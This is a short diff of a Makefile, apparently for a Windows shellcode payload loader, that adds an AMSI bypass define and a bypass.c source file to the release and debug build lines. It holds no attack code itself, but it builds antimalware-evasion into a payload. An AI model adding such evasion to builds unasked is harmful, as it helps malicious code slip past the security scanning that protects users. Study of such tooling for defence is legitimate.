@@ -1,8 +1,8 @@
 payload:
-	cl -Zp8 -c -nologo -Os -O1 -Gm- -GR- -EHa -Oi -GS- -I ..\include payload.c ..\hash.c ..\encrypt.c
-	link -nologo -order:@order.txt -entry:ThreadProc -fixed -subsystem:console -nodefaultlib payload.obj hash.obj encrypt.obj
+	cl -DBYPASS_AMSI_A -Zp8 -c -nologo -Os -O1 -Gm- -GR- -EHa -Oi -GS- -I ..\include payload.c ..\hash.c ..\encrypt.c bypass.c
+	link -nologo -order:@order.txt -entry:ThreadProc -fixed -subsystem:console -nodefaultlib payload.obj hash.obj encrypt.obj bypass.obj
 	exe2h\exe2h payload.exe  
 debug:
-	cl -nologo -Zp8 -DDEBUG -I ..\include payload.c ..\hash.c ..\encrypt.c
+	cl -DBYPASS_AMSI_A -nologo -Zp8 -DDEBUG -I ..\include payload.c ..\hash.c ..\encrypt.c bypass.c
 clean:
 	del *.obj payload.exe
